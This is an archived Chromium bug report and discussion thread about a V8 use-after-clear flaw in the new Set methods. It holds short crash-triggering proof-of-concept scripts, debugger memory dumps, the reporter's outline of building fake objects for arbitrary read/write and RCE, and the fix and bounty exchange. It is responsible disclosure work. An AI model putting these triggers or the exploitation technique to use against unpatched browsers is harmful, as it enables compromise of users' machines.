# Security: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed

| Field | Value |
|-------|-------|
| **Issue ID** | [40069798](https://issues.chromium.org/issues/40069798) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Runtime |
| **Platforms** | Linux |
| **Reporter** | ki...@gmail.com |
| **Assignee** | re...@chromium.org |
| **Created** | 2023-08-17 |
| **Bounty** | $15,000.00 |

## Description

VULNERABILITY DETAILS
## PoC
```
const v0 = new Set();
const v1 = new Set();
Object.defineProperty(v1, "size", {
  get: function () {
    v0.clear();
    return 1;
  },

});
v0.isDisjointFrom(v1);
```

## INTRODUCE
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 89295
    - link: https://crrev.com/3a70996b932030ab030347b039f92bab27270783 
- Commit Message

```
commit 3a70996b932030ab030347b039f92bab27270783
Author: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Date:   Tue Aug 1 17:56:22 2023 +0000

    [set-methods] Add isDisjointFrom to set methods
    
    This CL adds the generic path and fast path (with
    protectors) of isDisjointFrom to set methods.
    
    Bug: v8:13556
    Change-Id: Ib38bdee0454f024279f1b3657f9ebc60b37948fb
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4735497
    Reviewed-by: Shu-yu Guo <syg@chromium.org>
    Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#89295}

```

## CRASH LOG
- Debug output

```bash
# CMD: /tmp/d8-linux-debug-v8-component-89544/d8 --harmony --harmony-set-methods poc.js
# OUTPUT ==============================================================
abort: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:830] [../../src/builtins/set-is-disjoint-from.tq:27]

==== JS stack trace =========================================

    0: ExitFrame [pc: 0x7f99d1bce07d]
    1: isDisjointFrom [0x3d8b00159de5](this=0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#,0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#)
    2: /* anonymous */ [0x3d8b0015be85] [poc.js:10] [bytecode=0x3d8b0015bdfd offset=66](this=0x3d8b00143bd5 <JSGlobalProxy>#2#)
    3: InternalFrame [pc: 0x7f99d17ead5c]
    4: EntryFrame [pc: 0x7f99d17eaa87]

==== Details ================================================

[0]: ExitFrame [pc: 0x7f99d1bce07d]
[1]: isDisjointFrom [0x3d8b00159de5](this=0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#,0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#) {
// optimized frame
--------- s o u r c e   c o d e ---------
<No Source>
-----------------------------------------
}
[2]: /* anonymous */ [0x3d8b0015be85] [poc.js:10] [bytecode=0x3d8b0015bdfd offset=66](this=0x3d8b00143bd5 <JSGlobalProxy>#2#) {
  // heap-allocated locals
  var v0 = 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  var v1 = 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  // expression stack (top to bottom)
  [07] : 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  [06] : 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  [05] : 0x3d8b0024d9bd !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#3#
  [04] : 0x3d8b000056fd <String[4]: #size>
  [03] : 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  [02] : 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  [01] : 0x3d8b00159de5 <JSFunction isDisjointFrom (sfi = 0x3d8b00159db9)>#4#
  [00] : 0x3d8b00000251 <undefined>
--------- s o u r c e   c o d e ---------
const v0 = new Set();\x0aconst v1 = new Set();\x0aObject.defineProperty(v1, "size", {\x0a  get: function () {\x0a    v0.clear();\x0a    return 1;\x0a  },\x0a\x0a});\x0av0.isDisjointFrom(v1);
-----------------------------------------
}

[3]: InternalFrame [pc: 0x7f99d17ead5c]
[4]: EntryFrame [pc: 0x7f99d17eaa87]
-- ObjectCacheKey --

 #0# 0x3d8b0024d925: 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 #1# 0x3d8b0024d971: 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 #2# 0x3d8b00143bd5: 0x3d8b00143bd5 <JSGlobalProxy>
 #3# 0x3d8b0024d9bd: 0x3d8b0024d9bd !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
               get: 0x3d8b0024d9e9 <JSFunction get (sfi = 0x3d8b0015bd39)>#5#
 #4# 0x3d8b00159de5: 0x3d8b00159de5 <JSFunction isDisjointFrom (sfi = 0x3d8b00159db9)>
 #5# 0x3d8b0024d9e9: 0x3d8b0024d9e9 <JSFunction get (sfi = 0x3d8b0015bd39)>
=====================


```

## Other
Please note to include the flags `--harmony --harmony-set-methods` for clusterfuzz classification.

VERSION
Tested on v8 version: 11.7.0 - 11.8.0

REPRODUCTION CASE
1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-89544.zip
2. Run: `d8 --harmony --harmony-set-methods poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Zhenghang Xiao (@Kipreyyy)

## Attachments

- [poc.js](attachments/poc.js) (text/plain, 163 B)
- [poc.js](attachments/poc.js) (text/plain, 163 B)
- [demo.png](attachments/demo.png) (image/png, 278.8 KB)
- [exp.js](attachments/exp.js) (text/plain, 2.6 KB)
- [exploit.mp4](attachments/exploit.mp4) (video/mp4, 1000.0 KB)
- [exploit.js](attachments/exploit.js) (text/plain, 7.7 KB)

## Timeline

### ki...@gmail.com (2023-08-17)

VULNERABILITY DETAILS
## PoC
```
const v0 = new Set();
const v1 = new Set();
Object.defineProperty(v1, "size", {
  get: function () {
    v0.clear();
    return 1;
  },

});
v0.isDisjointFrom(v1);
```

## INTRODUCE
After bisect, it was determined that following commit caused this problem.

- Commit Info
    - Version: 89295
    - link: https://crrev.com/3a70996b932030ab030347b039f92bab27270783 
- Commit Message

```
commit 3a70996b932030ab030347b039f92bab27270783
Author: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Date:   Tue Aug 1 17:56:22 2023 +0000

    [set-methods] Add isDisjointFrom to set methods
    
    This CL adds the generic path and fast path (with
    protectors) of isDisjointFrom to set methods.
    
    Bug: v8:13556
    Change-Id: Ib38bdee0454f024279f1b3657f9ebc60b37948fb
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4735497
    Reviewed-by: Shu-yu Guo <syg@chromium.org>
    Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#89295}

```

## CRASH LOG
- Debug output

```bash
# CMD: /tmp/d8-linux-debug-v8-component-89544/d8 --harmony --harmony-set-methods poc.js
# OUTPUT ==============================================================
abort: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:830] [../../src/builtins/set-is-disjoint-from.tq:27]

==== JS stack trace =========================================

    0: ExitFrame [pc: 0x7f99d1bce07d]
    1: isDisjointFrom [0x3d8b00159de5](this=0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#,0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#)
    2: /* anonymous */ [0x3d8b0015be85] [poc.js:10] [bytecode=0x3d8b0015bdfd offset=66](this=0x3d8b00143bd5 <JSGlobalProxy>#2#)
    3: InternalFrame [pc: 0x7f99d17ead5c]
    4: EntryFrame [pc: 0x7f99d17eaa87]

==== Details ================================================

[0]: ExitFrame [pc: 0x7f99d1bce07d]
[1]: isDisjointFrom [0x3d8b00159de5](this=0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#,0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#) {
// optimized frame
--------- s o u r c e   c o d e ---------
<No Source>
-----------------------------------------
}
[2]: /* anonymous */ [0x3d8b0015be85] [poc.js:10] [bytecode=0x3d8b0015bdfd offset=66](this=0x3d8b00143bd5 <JSGlobalProxy>#2#) {
  // heap-allocated locals
  var v0 = 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  var v1 = 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  // expression stack (top to bottom)
  [07] : 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  [06] : 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  [05] : 0x3d8b0024d9bd !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#3#
  [04] : 0x3d8b000056fd <String[4]: #size>
  [03] : 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#1#
  [02] : 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>#0#
  [01] : 0x3d8b00159de5 <JSFunction isDisjointFrom (sfi = 0x3d8b00159db9)>#4#
  [00] : 0x3d8b00000251 <undefined>
--------- s o u r c e   c o d e ---------
const v0 = new Set();\x0aconst v1 = new Set();\x0aObject.defineProperty(v1, "size", {\x0a  get: function () {\x0a    v0.clear();\x0a    return 1;\x0a  },\x0a\x0a});\x0av0.isDisjointFrom(v1);
-----------------------------------------
}

[3]: InternalFrame [pc: 0x7f99d17ead5c]
[4]: EntryFrame [pc: 0x7f99d17eaa87]
-- ObjectCacheKey --

 #0# 0x3d8b0024d925: 0x3d8b0024d925 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 #1# 0x3d8b0024d971: 0x3d8b0024d971 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 #2# 0x3d8b00143bd5: 0x3d8b00143bd5 <JSGlobalProxy>
 #3# 0x3d8b0024d9bd: 0x3d8b0024d9bd !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
               get: 0x3d8b0024d9e9 <JSFunction get (sfi = 0x3d8b0015bd39)>#5#
 #4# 0x3d8b00159de5: 0x3d8b00159de5 <JSFunction isDisjointFrom (sfi = 0x3d8b00159db9)>
 #5# 0x3d8b0024d9e9: 0x3d8b0024d9e9 <JSFunction get (sfi = 0x3d8b0015bd39)>
=====================


```

## Other
Please note to include the flags `--harmony --harmony-set-methods` for clusterfuzz classification.

VERSION
Tested on v8 version: 11.7.0 - 11.8.0

REPRODUCTION CASE
1. Download debug v8 from: gs://v8-asan/linux-debug/d8-linux-debug-v8-component-89544.zip
2. Run: `d8 --harmony --harmony-set-methods poc.js`

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: tab

CREDIT INFORMATION
Reporter credit: Zhenghang Xiao (@Kipreyyy)

### ki...@gmail.com (2023-08-17)

[Comment Deleted]

### [Deleted User] (2023-08-17)

[Empty comment from Monorail migration]

### ki...@gmail.com (2023-08-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-08-17)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5026764239339520.

### an...@chromium.org (2023-08-17)

Possibly a duplicate of https://crbug.com/1467323 based on CF report. I'll let clemensb@ confirm.


[Monorail components: Blink>JavaScript Blink>JavaScript>Runtime]

### an...@chromium.org (2023-08-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-17)

[Empty comment from Monorail migration]

### ki...@gmail.com (2023-08-17)

Can you cc me to the cf report of this issue-1467323，I have an issue that was merged into it before, but I believe this is not the same issue as the previous one

### cl...@chromium.org (2023-08-17)

This does not look like a duplicate of https://crbug.com/1467323 to me. It's a different CSA_DCHECK that's failing.

Clusterfuzz confirms the bisection:
3a70996 [set-methods] Add isDisjointFrom to set methods by Rezvan Mahdavi Hezaveh · 2 weeks ago

Assigning to Shu as the reviewer.

Feel free to adapt severity and priority.

### cl...@chromium.org (2023-08-17)

Ha, sorry, didn't realize that Rezvan is a Chromie as well :) 

### re...@chromium.org (2023-08-17)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-17)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gi...@appspot.gserviceaccount.com (2023-08-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/9e0005d745067c5dab681d9c95483bc71c317e2d

commit 9e0005d745067c5dab681d9c95483bc71c317e2d
Author: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Date: Fri Aug 18 00:08:23 2023

[set-methods]Getting other before receiver's table

This CL fix the issue of clearing receiver in case of
having user arbitraty code in the `other`.

Bug: v8:13556, chromium:1473631
Change-Id: I1869c0366c27d26d6320950d60c855802f5798fc
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4789443
Reviewed-by: Shu-yu Guo <syg@chromium.org>
Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Cr-Commit-Position: refs/heads/main@{#89550}

[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-is-disjoint-from.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-union.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-difference.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-union.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-intersection.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-symmetric-difference.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-is-superset-of.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-is-subset-of.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-is-superset-of.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-is-disjoint-from.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-is-subset-of.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/src/builtins/set-intersection.tq
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-symmetric-difference.js
[modify] https://crrev.com/9e0005d745067c5dab681d9c95483bc71c317e2d/test/mjsunit/harmony/set-difference.js


### cl...@chromium.org (2023-08-18)

ClusterFuzz testcase 5026764239339520 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=89549:89550

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### [Deleted User] (2023-08-18)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-18)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-18)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M116. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M117. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-19)

Merge review required: M116 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), obenedict (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-08-19)

Merge review required: M117 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), matthewjoseph (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ki...@gmail.com (2023-08-20)

```
// https://tc39.es/proposal-set-methods/#sec-set.prototype.isdisjointfrom
transitioning javascript builtin SetPrototypeIsDisjointFrom(
    js-implicit context: NativeContext,
    receiver: JSAny)(other: JSAny): Boolean {
  const methodName: constexpr string = 'Set.prototype.isDisjointFrom';
  const fastIteratorResultMap = GetIteratorResultMap();

  // 1. Let O be the this value.
  // 2. Perform ? RequireInternalSlot(O, [[SetData]]).
  const o = Cast<JSSet>(receiver) otherwise
  ThrowTypeError(
      MessageTemplate::kIncompatibleMethodReceiver, methodName, receiver);

  const table = Cast<OrderedHashSet>(o.table) otherwise unreachable;
  Print(o); //---->[1]
  Print(table); //----->[2]
  // 3. Let otherRec be ? GetSetRecord(other).
  let otherRec = GetSetRecord(other, methodName); // ---->[3] callback

  // 4. Let thisSize be the number of elements in O.[[SetData]].
  const thisSize =
      LoadOrderedHashTableMetadata(table, kOrderedHashSetNumberOfElementsIndex);
  Print(Convert<Smi>(thisSize));
```

```
const v0 = new Set();
const v1 = new Set();
Object.defineProperty(v1, "size", {
  get: function () {
    print("callback start");
    %SystemBreak();
    v0.clear(); //---->[3]
    %SystemBreak();
    return 1;
  },

});
print(v0.isDisjointFrom(v1));
```

1. Print(o); that is, printing v0
DebugPrint: 0x20c60004d971: [JSSet]
 - map: 0x20c600189501 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x20c600189635 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 - elements: 0x20c600000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - table: 0x20c60004d981 <OrderedHashSet[13]>
 - properties: 0x20c600000219 <FixedArray[0]>
 - All own properties (excluding elements): {}


2. Print(table); here, fetching the address of table from o.table and caching it in the table variable
DebugPrint: 0x20c60004d981: [OrderedHashSet]
 - FixedArray length: 13
 - elements: 0
 - deleted: 0
 - buckets: 2
 - capacity: 4
 - buckets: {
              0: -1
              1: -1
 }
 - elements: {
 }

3. Triggering other, which is the callback defined on v1, clears v0. At this point, the previously cached table and the actual v0.table no longer match. In other words, table no longer points to an OrderedHashSet object of v0. It has become misaligned, but the program's execution logic is not aware of this.
callback start
...
pwndbg> job 0x20c60004d971
0x20c60004d971: [JSSet]
 - map: 0x20c600189501 <Map[16](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x20c600189635 !!!INVALID SHARED ON CONSTRUCTOR!!!<JSObject>
 - elements: 0x20c600000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - table: 0x20c60004da71 <OrderedHashSet[13]>
 - properties: 0x20c600000219 <FixedArray[0]>
 - All own properties (excluding elements): {}

4. The specific impact is as follows:
  const thisSize =
      LoadOrderedHashTableMetadata(table, kOrderedHashSetNumberOfElementsIndex);
Here, the value representing the number of elements in the set is fetched from the cached table at 0x20c60004d980 + 0x8. However, due to the misalignment, it reads an incorrect value, resulting in an incorrect size.
pwndbg> x/20wx 0x20c60004d981-1
0x20c60004d980:	0x00001c65	0x0000001a	0x0004da71//--->elements size	0xfffffffe
0x20c60004d990:	0x00000004	0xfffffffe	0xfffffffe	0x00000251
0x20c60004d9a0:	0x00000251	0x00000251	0x00000251	0x00000251
0x20c60004d9b0:	0x00000251	0x00000251	0x00000251	0x0019bf99
0x20c60004d9c0:	0x00000219	0x00000219	0x0004d9cd	0x00001c65

pwndbg> c
Continuing.
DebugPrint: Smi: 0x26d38 (159032)--->(= 0x0004da71>>1, due to pointer compression)



All set functions exhibit this issue. Although isDisjointFrom can only return true or false, there are many other functions that can have more impact. Through the Union operation, we can trigger a segmentation fault (segfault). I will continue to investigate the exploitability of this vulnerability, but as of now, it seems to be an exploitable vulnerability.
```
const firstSet = new Set();
firstSet.add(42);
firstSet.add(43);
firstSet.add(44);

const otherSet = new Set();
otherSet.add(45);
otherSet.add(46);
otherSet.add(47);

Object.defineProperty(otherSet, 'size', {
  get: function() {
    firstSet.clear();
    return 3;
  },

});

const unionArray = Array.from(firstSet.union(otherSet));
```


### [Deleted User] (2023-08-21)

This high+ V8 security issue with stable impact requires a lightweight post mortem. Please take some time to answer questions asked in this form [1] to help us improve V8 security. [1] https://docs.google.com/forms/d/e/1FAIpQLSdSMCiEpIFLLFkMbgtulK1sf1B-idQmkFaA4XP2Rz5mN1cqWg/viewform?usp=pp_url&entry.307501673=1473631&entry.364066060=External&entry.763880440=Extended&entry.1678852700=High&entry.763402679=Blink>JavaScript,Blink>JavaScript>Runtime&entry.975983575=rezvan@chromium.org Please ensure to copy the full link, as otherwise some issue meta data might not be populated automatically. 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### re...@chromium.org (2023-08-21)

https://crbug.com/chromium/1473631#c19 (c19) and https://crbug.com/chromium/1473631#c20 (c20): This is a new feature. It is behind a flag and it is disabled by default. So there is no need for a merge request.

### re...@chromium.org (2023-08-21)

https://crbug.com/chromium/1473631#c21: Thanks for your comment kipreyxx@gmail.com. The issue is already fixed for all set methods in https://chromium-review.googlesource.com/c/v8/v8/+/4789443

### ki...@gmail.com (2023-08-25)

[Comment Deleted]

### ki...@gmail.com (2023-08-25)

This vulnerability can be used to perform remote code execution. Currently we have constructed an exploit that can fake arbitrary objects and implement arbitrary address reads and writes.

We repeat the SetPrototypeDelete operation on the obsoleted OrderedHashSet several times to offset the next_table pointer stored on the obsoleted OrderedHashSet forward into the double array. We can then call the SetPrototypeGetSize method by accessing the set.size property to retrieve the object pointed to by the next_table pointer, which is the fake object we've carefully deployed in the double array.

Eventually we can fake arbitrary objects, which unsurprisingly can result in RCE.

repro steps:
$ git checkout f118dd
$ gclient sync
$ ./tools/dev/gm.py x64.release
$ ./out/x64.release/d8 --allow-natives-syntax --harmony exp.js

### ki...@gmail.com (2023-08-25)

Upload exploits and demo screenshot.

### sy...@chromium.org (2023-08-25)

Note that --harmony-set-methods is staged, not shipped, meaning it's on for fuzzing only but the flag is off by default. I wouldn't say this has Security_Impac-Extended.

### ki...@gmail.com (2023-08-25)

Yes, I also think this should be marked as security-None. 
Here, I provide the exp only for Chrome VRP to qualify for a reward.

### pg...@google.com (2023-08-25)

Updating the impact (and removing related merge labels) per https://crbug.com/chromium/1473631#c28 and https://crbug.com/chromium/1473631#c29 (: thank you both for the info!

Adding OS

### ki...@gmail.com (2023-08-29)

[Comment Deleted]

### ki...@gmail.com (2023-08-29)

Full RCE exploit is avaliable now! 

The exploit needs to be run several times to trigger, and if the build v8 command is different than what we used, then some of the offsets within the exploit need to be adjusted.

### am...@chromium.org (2023-09-05)

[Description Changed]

### am...@google.com (2023-09-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-09-07)

Congratulations Kiprey! The VRP Panel has decided to award you $15,000 for this report of of renderer RCE & functional exploit + $1,000 bisect bonus. Thank you for your efforts and reporting this issue to us -- nice work! 

### ki...@gmail.com (2023-09-07)

Hi amy! I would like to inquire about the details of the vulnerability reward for this issue. Given that we have provided a complete exploit and have also uploaded a video demonstrating the vulnerability's exploitation, we believe the reward should be $21,000, similar to https://crbug.com/chromium/1423610.

### am...@chromium.org (2023-09-07)

Hello! Unfortunately the reward amount for https://crbug.com/chromium/1423610 was based on the V8 Exploit Bonus, which has been sunset as of 10 August and replaced with the Bonus / Reward for V8 bugs in <= Stable versions [1][2]. Functional exploits for V8 now fall into the category of `renderer RCE, high quality report with functional exploit` unless they are included for a report  that meets the criteria of a V8 bug impacting Stable channel or older versions of Chrome [1].  


[1] https://g.co/chrome/vrp/##rewards-for-v8-bugs-in-stable-channel-and-older-versions
[2] email: subj: Change in V8 Specific Bonuses, to Chrome VRP reporters community, 10 August 2023

### am...@google.com (2023-09-09)

[Empty comment from Monorail migration]

### [Deleted User] (2023-11-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1473631?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript, Blink>JavaScript>Runtime]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40069798)*
